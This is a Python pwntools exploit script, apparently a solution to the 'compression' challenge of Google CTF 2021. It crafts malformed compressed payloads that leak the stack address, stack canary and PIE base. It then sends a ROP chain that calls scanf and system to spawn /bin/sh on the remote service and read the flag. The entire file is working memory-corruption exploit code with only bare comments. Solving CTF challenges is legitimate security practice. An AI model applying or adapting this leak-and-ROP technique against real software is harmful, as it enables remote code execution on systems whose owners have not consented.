from pwn import * 
context.binary='./compress'
context.log_level='debug'



sa = lambda a, b: cn.sendafter(a, b)
sla = lambda a, b: cn.sendlineafter(a, b)

def un_number(number_string):
    number = 0
    leng = len(number_string)
    for i in range(leng // 2):
        var = int(number_string[i*2:i*2+2], 16) << (i * 8)
        number = number | var
    return number


def handle_number(number, sig=0):
    string = ""
    if sig > 0:
        number = (~(number) + 1) & 0xffffffffffffffff
    while(1):
        if (number > 0x7f):
            var = number 
            string += "{:02x}".format((var | 0x80) & 0xff)
            number >>= 7 
        else:
            string += "{:02x}".format(number)
            return string

def handle_datas(datas):
    string = ""
    for data in datas:
        string += handle_data(data)
    return string

def handle_data(data):
    string = ""
    for i in p64(data):
        string += "{:02x}".format(i)
    return string

def repeat(characters, repetition, sig = 0):
    if sig == 0:
        return "ff" + handle_number(characters) + handle_number(repetition)
    if sig == 1:
        return "ff" + handle_number(characters, 1) + handle_number(repetition)
    if sig == 2:
        return "ff" + handle_number(characters) + handle_number(repetition, 1)
    if sig == 3:
        return "ff" + handle_number(characters, 1) + handle_number(repetition, 1)


def compress(datas, repetitions):
    comp = ""
    for data in datas:
        comp += handle_data(data)
    comp += "ff" + handle_number(len(datas) * 0x8) + handle_number(repetitions-1)
    return comp

def pad8(len):
    return '11' * len * 8


cmd = ""
bps = [0x000000000001346, 0x00000000000019C4]
for bp in bps:
    cmd += "b * $rebase({})\n".format(bp)

magic = "54494e59" 
end   = "ff0000"


def sig1(cn):
    cn.sendlineafter("3. Read compression format documentation", str(1))
    cn.sendlineafter("Send me the hex-encoded string (max 4k):", flat('1122' * 0x40))

def sig2(cn):
    # payload = "54494e590000557C7B5603CAff08ff3fff0000"
    # payload = magic + pad(2) + pad8(0) + compress([
        # 0x1111111111111111, 
    # ], 0x1000) + end

    cn.sendlineafter("3. Read compression format documentation", str(2))

    # payload = magic + repeat(0x204*8, 8, 1) + repeat(0x200 * 8, 8, 1) + repeat(0x1ff * 8, 8, 1) + repeat(0x201*8, 8, 1) + repeat(0x20, 0x1020)+ end
    payload = magic + repeat(0x208*8, 8, 1) + repeat(0x200*8, 8, 1) + handle_data(0x3) + repeat(0x201*8, 8, 1) + repeat(0x20, 0x1050)+ end

    # gdb.attach(cn, cmd)
    print(payload)
    cn.sendlineafter("Send me the hex-encoded string (max 4k):", payload)
    cn.recvuntil("That decompresses to:\n")
    stack = un_number(cn.recvn(16, 2).decode())
    print("stack: " + hex(stack))
    binsh = stack - 0x1128
    print("binsh: " + hex(binsh))

    canary = un_number(cn.recvn(16, 2).decode())
    print("canary: " + hex(canary))
    a = un_number(cn.recvn(16, 2).decode())
    print(a==0x3)

    start = un_number(cn.recvn(16, 2).decode())
    print("start: " + hex(start))
    pie = start - 0x0000000000014E0
    print("pie: " + hex(pie))


    cn.sendlineafter("3. Read compression format documentation", str(2))
    
    system  = pie + 0x1134
    pop     = pie + 0x1B03  # pop rdi, ret;
    puts    = pie + 0x1110

    poprsi  = 0x1b01 + pie  # pop rsi, pop r15, ret,
    scanf   = 0x1184 + pie  
    bss     = 0x4050 + pie  # /bin/sh\x00 
    ret     = 0x1b04 + pie  # ret
    s       = 0x20c6 + pie  # "%800s"

    payload = magic + pad8(1) + compress([
        canary, 
        1, 
        2,
        3, 
        4, 
        5, 
        pop,
        s,
        poprsi, 
        bss,   
        0xa ,
        scanf, 
        pop, 
        bss, 
        ret,
        system 
    ], 0x1050) + end

    print(payload)
    # gdb.attach(cn, cmd)
    cn.sendlineafter("Send me the hex-encoded string (max 4k):", payload)

    cn.sendline("/bin/sh\x00")
    cn.sendline("cat flag")
    cn.interactive()

# cn1 = context.binary.process()
cn1 = remote("compression.2021.ctfcompetition.com", 1337)
sig2(cn1)
